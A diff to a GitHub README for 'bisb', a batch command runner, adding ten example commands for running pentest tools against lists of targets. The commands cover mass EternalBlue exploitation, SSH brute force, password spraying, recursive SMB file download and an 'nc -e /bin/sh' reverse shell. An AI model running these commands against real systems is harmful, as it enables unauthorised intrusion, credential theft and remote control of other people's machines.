@@ -59,6 +59,82 @@ Here are some examples of how to use **bisb**:
 
 Contributions to **bisb** are welcome! Please feel free to [open an issue](https://github.com/GTekSD/Batch-is-Better/issues) or [submit a pull request](https://github.com/GTekSD/Batch-is-Better/pulls) for enhancements or bug fixes.
 
+
+
+
+-----------------
+
+# In Pentesting
+
+To demonstrate how **bisb (Batch is Better)** can be highly useful in a pentesting scenario, here are 10 critical examples that simplify complex tasks:
+
+### 1. **Automated Vulnerability Scanning**
+```
+$ bisb "nmap -sV --script vuln" target_list_with_ports.txt
+```
+- This command runs a vulnerability scanning on specific ports on multiple targets, this is the quickest way to complete a full scan.
+- List.txt should be in this format:
+  192.168.1.100 -p 8080
+  192.168.1.200 -p 1433
+
+### 2. **Brute Force Attack**
+```
+$ bisb "hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100" servers.txt
+```
+- Automates brute force attacks on multiple SSH servers, saving time and effort.
+
+### 3. **Automated Exploit Execution**
+```
+$ bisb "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS' $line; run" targets.txt
+```
+- Automatically runs the EternalBlue exploit on a list of vulnerable targets.
+
+### 4. **Mass Password Spraying**
+```
+$ bisb "crackmapexec smb $line -u users.txt -p password123" targets.txt
+```
+- Executes password spraying across multiple SMB servers, helping identify weak passwords.
+
+### 5. **File Enumeration and Extraction**
+```
+$ bisb "smbclient //$line/shared -c 'prompt OFF; recurse ON; mget *'" smb_servers.txt
+```
+- Recursively downloads files from shared folders on multiple SMB servers.
+
+### 6. **Batch Web Application Testing**
+```
+$ bisb "nikto -h $line" web_targets.txt
+```
+- Runs Nikto web server vulnerability scans on a list of web applications.
+
+### 7. **Automated Directory Bruteforcing**
+```
+$ bisb "dirb http://$line /usr/share/wordlists/dirb/common.txt" web_targets.txt
+```
+- Uses Dirb to brute force directories on multiple web applications, revealing hidden paths.
+
+### 8. **SQL Injection Testing**
+```
+$ bisb "sqlmap -u http://$line --batch" sql_targets.txt
+```
+- Automates SQL injection testing across various web applications.
+
+### 9. **Network Reconnaissance**
+```
+$ bisb "netdiscover -i eth0 -r $line/24" subnets.txt
+```
+- Discovers live hosts within multiple subnets, crucial for network mapping.
+
+### 10. **Automated Reverse Shell Deployment**
+```
+$ bisb "nc -e /bin/sh 192.168.1.200 4444" target_list.txt
+```
+- Establishes reverse shells on multiple targets for remote control.
+
+### Summary
+These examples show how **bisb (Batch is Better)** can automate repetitive and critical tasks during a pentest, making the process more efficient and less error-prone. It saves time, increases productivity, and ensures comprehensive coverage across multiple targets.
+
+
 ## License
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
